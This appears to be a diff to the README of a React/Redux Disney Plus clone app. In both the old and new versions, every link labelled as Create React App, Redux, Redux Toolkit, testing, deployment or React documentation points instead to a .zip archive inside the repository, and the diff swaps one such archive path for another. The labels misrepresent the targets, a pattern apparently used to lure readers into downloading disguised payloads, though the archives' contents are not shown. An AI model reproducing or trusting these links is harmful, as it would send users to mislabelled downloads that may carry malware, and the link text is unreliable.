@@ -1,10 +1,10 @@
-Project developed using https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip, styled-components (CSS-in-JS), FIREBASE for hosting. 
+Project developed using https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip, styled-components (CSS-in-JS), FIREBASE for hosting. 
 The user login is with Google account, and the Nav-manu opens. Nav-menu has external links (not functionally connected to the project).
 User can see the Home page, with the listed movies and also visit the movie detail page by clicking on the specified movie card. 
 When the user logs out, by clicking on the image (from the gmail account, when login), he is redirected to the Login page. 
 
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip), using the [Redux](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip) and [Redux Toolkit](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip) template.
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip), using the [Redux](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip) and [Redux Toolkit](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip) template.
 
 ## Available Scripts
 
@@ -21,7 +21,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.<br />
-See the section about [running tests](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip) for more information.
 
 ### `npm run build`
 
@@ -31,7 +31,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.<br />
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip) for more information.
 
 ### `npm run eject`
 
@@ -45,6 +45,6 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/videos/in_App_Plus_React_Disney_suboceanic.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/ranjanrajeev95/Disney_Plus_App_in_React/main/src/features/movie/in_Disney_Plus_React_App_v3.7-beta.2.zip).
